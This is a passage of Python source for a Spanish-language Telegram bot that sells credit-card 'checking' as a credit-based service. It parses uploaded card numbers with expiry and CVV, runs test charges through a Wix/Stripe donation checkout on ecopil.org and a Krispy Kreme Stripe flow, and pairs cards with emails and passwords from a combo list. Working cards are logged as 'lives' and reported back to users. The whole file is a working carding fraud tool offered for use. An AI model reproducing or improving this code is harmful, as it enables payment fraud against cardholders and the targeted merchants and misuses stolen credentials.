                "cancelUrl": f"https://www.ecopil.org/checkout?checkoutId={carro_tok}&successUrl=https%3A%2F%2Fwww.ecopil.org%2Fdonation-thank-you-page%2F%3Forderid%3D%7BorderId%7D%26campaignid%3D2c882aa1-c6c2-4e62-b524-c300209c357f&contentAppId=333b456e-dd48-4d6b-b32b-9fd48d74e163&contentComponentId=da4e05fc-2a03-44f9-aee6-f6398c5a7cb4&disableContinueShopping=true&redirect=cancel",
                "successUrl": "https://www.ecopil.org/donation-thank-you-page/?orderid={orderId}&campaignid=2c882aa1-c6c2-4e62-b524-c300209c357f",
                "pendingUrl": "https://www.ecopil.org/donation-thank-you-page/?orderid={orderId}&campaignid=2c882aa1-c6c2-4e62-b524-c300209c357f",
            },
            "savePaymentMethod": False,
            "delayCapture": False,
        }

        resp = session.post(url_place_order, headers=headers_place_order, json=payload_place_order)
        resultado = resp.text

        if "DECLINED" in resultado or "Invalid payment status" in resultado:
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | Tarjeta DECLINADA\n")
            return False, "Tarjeta DECLINADA"
        elif '"completed":true' in resultado or "paymentResponseToken" in resultado:
            with open(LIVES_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | Transacción APROBADA\n")
            return True, "¡Transacción APROBADA / Completada!"
        else:
            msg_res = f"Respuesta: {resultado[:100]}"
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {msg_res}\n")
            return False, msg_res

    except Exception as e:
        err_msg = f"Error inesperado: {e}"
        with open(FAIL_FILE, "a", encoding="utf-8") as f:
            f.write(f"{linea_cc} | {err_msg}\n")
        return False, err_msg


def worker_principal():
    while True:
        if estado["detener"]:
            time.sleep(0.5)
            continue

        if cola_tareas.empty():
            time.sleep(1)
            continue

        tarea = cola_tareas.get()
        try:
            chat_id = tarea.get("chat_id")
            user_id = tarea.get("user_id")
            linea_cc = tarea.get("linea_cc")
            correo = tarea.get("correo")
            password = tarea.get("password")

            if user_id:
                saldo_actual = obtener_saldo(user_id)
                if saldo_actual is None or saldo_actual < COSTO_SUCCESS:
                    with estado_lock:
                        estado["en_progreso"] = False
                    bot.send_message(
                        chat_id, 
                        f"⛔ <b>Proceso detenido:</b> Saldo insuficiente ({saldo_actual} créditos).", 
                        parse_mode="HTML"
                    )
                    break

            # Ejecutar el gate seleccionado dinámicamente
            if "Krispy" in estado["gate_activo"]:
                exito, mensaje_resultado = procesar_tarjeta_krispy(linea_cc, correo, password)
            else:
                exito, mensaje_resultado = procesar_tarjeta_wix(linea_cc)

            if user_id:
                cobrar_creditos_por_resultado(user_id, exito)

            with estado_lock:
                estado["procesados"] += 1
                if exito:
                    estado["exitosos"] += 1
                    estado["lista_exitos"].append({"cc": linea_cc, "msg": mensaje_resultado})
                else:
                    estado["fallidos"] += 1
                    estado["lista_fallos"].append({"cc": linea_cc, "msg": mensaje_resultado})

            notificar_resultado_telegram(chat_id, exito, linea_cc, mensaje_resultado)

            with estado_lock:
                if estado["procesados"] >= estado["total"] or estado["detener"]:
                    estado["en_progreso"] = False
                    if estado["procesados"] >= estado["total"]:
                        resumen_final = generar_resumen_proceso(user_id)
                        bot.send_message(
                            chat_id, 
                            "🏁 <b>¡Proceso completado con éxito!</b>\n\n" + resumen_final, 
                            parse_mode="HTML"
                        )
                        notificar_propietario(generar_informe_propietario())
                        notificar_usuarios_en_espera()

        except Exception as e:
            print(f"Error en worker HTTP: {e}")
        finally:
            cola_tareas.task_done()
        
        time.sleep(1)


def notificar_resultado_telegram(chat_id, exito, linea_cc, mensaje_detectado):
    if not chat_id:
        return
    status_texto = "SUCCESS✅" if exito else "FAIL❌"
    mensaje = f"STATUS: {status_texto}\n💳 <code>{linea_cc}</code>\n💬 <b>Mensaje:</b> <i>{mensaje_detectado[:100]}</i>"
    try:
        bot.send_message(chat_id, mensaje, parse_mode="HTML")
    except Exception:
        pass


def recibir_datos_lote(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username or "Anonimo"
    texto_entrada = ""

    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            texto_entrada = downloaded_file.decode("utf-8", errors="ignore")
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error al leer el archivo: {e}")
            return
    elif message.text:
        texto_entrada = message.text

    if not texto_entrada.strip():
        bot.send_message(chat_id, "⚠️ No se recibió texto válido.")
        return

    patron = re.compile(r'(\d{15,16})[|/]?\s*(\d{2})[|/]\s*(\d{2,4})[|/]\s*(\d{3,4})')

    tarjetas_validas = []
    tarjetas_rechazadas = []

    for linea in texto_entrada.splitlines():
        linea = linea.strip()
        if not linea:
            continue
        coincidencia = patron.search(linea)
        if not coincidencia:
            tarjetas_rechazadas.append((linea, "FORMATO_MAL"))
            continue

        cc, mes, anio, cvv = coincidencia.groups()
        es_valida, resultado = validar_tarjeta(cc, mes, anio, cvv)

        if es_valida:
            linea_limpia = f"{cc}|{mes}|{resultado}|{cvv}"
            tarjetas_validas.append(linea_limpia)
        else:
            tarjetas_rechazadas.append((linea, resultado))

    if tarjetas_rechazadas:
        reporte_descartes = "⚠️ <b>Tarjetas omitidas (Sin cobro de créditos):</b>\n\n"
        for item, motivo in tarjetas_rechazadas[:20]:
            reporte_descartes += f"❌ <code>{item}</code> ➔ <b>{motivo}</b>\n"
        bot.send_message(chat_id, reporte_descartes, parse_mode="HTML")

    if not tarjetas_validas:
        bot.send_message(chat_id, "⛔ Ninguna tarjeta válida para procesar.", parse_mode="HTML")
        return

    combos_path = os.path.join(BASE_DIR, "COMBO.txt")
    combos = []
    if os.path.exists(combos_path):
        with open(combos_path, "r", encoding="utf-8") as f:
            combos = [l.strip() for l in f if ":" in l and l.strip()]

    while not cola_tareas.empty():
        try:
            cola_tareas.get_nowait()
            cola_tareas.task_done()
        except queue.Empty:
            break

    with estado_lock:
        estado["en_progreso"] = True
        estado["detener"] = False
        estado["total"] = len(tarjetas_validas)
        estado["procesados"] = 0
        estado["exitosos"] = 0
        estado["fallidos"] = 0
        estado["lista_exitos"] = []
        estado["lista_fallos"] = []
        estado["usuario_actual"] = username
        estado["chat_id_actual"] = chat_id
        estado["user_id_actual"] = user_id

    global contador_expiradas
    contador_expiradas += len([r for r in tarjetas_rechazadas if r[1] == "EXPIRADA"])

    for linea_cc in tarjetas_validas:
        correo, password = "", ""
        if combos:
            linea_combo = random.choice(combos)
            try:
                correo, password = linea_combo.split(":", 1)
            except ValueError:
                pass

        cola_tareas.put({
            "linea_cc": linea_cc,
            "correo": correo.strip(),
            "password": password.strip(),
            "chat_id": chat_id,
            "user_id": user_id
        })

    bot.send_message(
        chat_id,
        f"🚀 <b>Lote aceptado:</b> {len(tarjetas_validas)} tarjetas en cola usando <b>{estado['gate_activo']}</b>.",
        parse_mode="HTML"
    )

    notificar_propietario(
        f"🚀 <b>NUEVO CHEQUEO INICIADO</b>\n"
        f"• <b>Gate:</b> {estado['gate_activo']}\n"
        f"• <b>Usuario:</b> @{username} (<code>{user_id}</code>)\n"
        f"• <b>Total de CCs:</b> {len(tarjetas_validas)}"
    )


@bot.message_handler(commands=["start"])
def cmd_start(message):
    uid = message.from_user.id
    uname = message.from_user.username
    creado, saldo = registrar_usuario(uid, uname)

    msg = f"👋 ¡Hola {message.from_user.first_name}!\n\n"
    if creado:
        msg += f"🎉 <b>¡Bienvenido! Se te han otorgado {CREDITOS_INICIALES} créditos gratis</b> por registrarte.\n\n"
    msg += f"💰 *Tus créditos actuales:* {saldo}\n\nUsa el menú para navegar."
    bot.send_message(message.chat.id, msg, parse_mode="HTML", reply_markup=obtener_menu_principal())


@bot.message_handler(commands=["id", "me", "perfil"])
def cmd_mi_perfil(message):
    uid = message.from_user.id
    uname = message.from_user.username or "Sin usuario"
    registrar_usuario(uid, message.from_user.username)
    saldo = obtener_saldo(uid)

    texto = (
        "👤 <b>TUS DATOS DE PERFIL</b>\n"
        "─────────────────────────\n"
        f"• <b>Nombre:</b> {message.from_user.first_name}\n"
        f"• <b>Username:</b> @{uname}\n"
        f"• <b>ID de Telegram:</b> <code>{uid}</code>\n"
        f"• <b>Créditos disponibles:</b> <b>{saldo}</b> 💰"
    )
    bot.send_message(message.chat.id, texto, parse_mode="HTML")


@bot.message_handler(commands=["creditos", "credit"])
def cmd_gestion_creditos(message):
    if message.from_user.id != PROPIETARIO_ID:
        bot.send_message(message.chat.id, "⛔ Comando exclusivo del administrador.")
        return

    partes = message.text.split()
    if len(partes) < 3:
        bot.send_message(message.chat.id, "⚠️ Uso: <code>/creditos ID +20</code>", parse_mode="HTML")
        return

    identificador = partes[1]
    param_cant = partes[2]

    try:
        cantidad = int(param_cant)
    except ValueError:
        bot.send_message(message.chat.id, "❌ Cantidad inválida.", parse_mode="HTML")
        return

    exito, resultado = modificar_creditos_por_identificador(identificador, cantidad)
    if not exito:
        bot.send_message(message.chat.id, f"❌ {resultado}", parse_mode="HTML")
        return

    uid_afectado, uname_afectado, nuevo_saldo = resultado
    bot.send_message(message.chat.id, f"✅ Créditos actualizados para @{uname_afectado}. Nuevo saldo: <b>{nuevo_saldo}</b>", parse_mode="HTML")


@bot.message_handler(commands=['stop', 'detener', 'parar'])
def cmd_stop_proceso(message):
    chat_id = message.chat.id
    with estado_lock:
        if not estado["en_progreso"]:
            bot.send_message(chat_id, "⚠️ No hay ningún proceso en ejecución.")
            return
        estado["detener"] = True
        estado["en_progreso"] = False

    while not cola_tareas.empty():
        try:
            cola_tareas.get_nowait()
            cola_tareas.task_done()
        except queue.Empty:
            break

    bot.send_message(chat_id, "🛑 <b>El proceso ha sido detenido.</b>", parse_mode="HTML")
    resumen_texto = generar_resumen_proceso(message.from_user.id)
    bot.send_message(chat_id, resumen_texto, parse_mode="HTML")
    notificar_usuarios_en_espera()


@bot.callback_query_handler(func=lambda call: True)
def callback_listener(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id

    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

    if call.data == "btn_elegir_gate":
        mostrar_selector_gates(chat_id, user_id)
    elif call.data == "gate_krispy":
        with estado_lock:
            estado["gate_activo"] = "Krispy Kreme (Stripe API)"
        bot.edit_message_text("🍩 Has seleccionado: <b>Krispy Kreme</b>", chat_id, call.message.message_id, parse_mode="HTML")
        solicitar_datos_ccs(chat_id, user_id)
    elif call.data == "gate_wix":
        with estado_lock:
            estado["gate_activo"] = "Stripe Wix Charger ($50 - Ecopil)"
        bot.edit_message_text("💳 Has seleccionado: <b>Stripe Wix Charger ($50 - Ecopil)</b>", chat_id, call.message.message_id, parse_mode="HTML")
        solicitar_datos_ccs(chat_id, user_id)
    elif call.data == "btn_saldo":
        saldo = obtener_saldo(user_id)
        bot.send_message(chat_id, f"💰 Tienes <b>{saldo}</b> créditos disponibles.", parse_mode="HTML")
    elif call.data == "btn_instrucciones":
        inst = (
            "📖 <b>GUÍA DEL BOT</b>\n\n"
            "• <b>Gate 1:</b> Krispy Kreme (Stripe API)\n"
            "• <b>Gate 2:</b> Stripe Wix Charger ($50 - Ecopil)\n"
            "📌 <b>Formato:</b> <code>CC|MM|AAAA|CVV</code>"
        )
        bot.send_message(chat_id, inst, parse_mode="HTML")
    elif call.data == "btn_avisar":
        with espera_lock:
            usuarios_espera_alerta.add(chat_id)
        bot.send_message(chat_id, "🔔 Te notificaremos cuando el bot esté libre.", parse_mode="HTML")


if __name__ == "__main__":
    threading.Thread(target=worker_principal, daemon=True, name="Worker-HTTP").start()
    print("🤖 Bot de Telegram con ambos Gates en marcha...")
    bot.infinity_polling(timeout=20, long_polling_timeout=10)
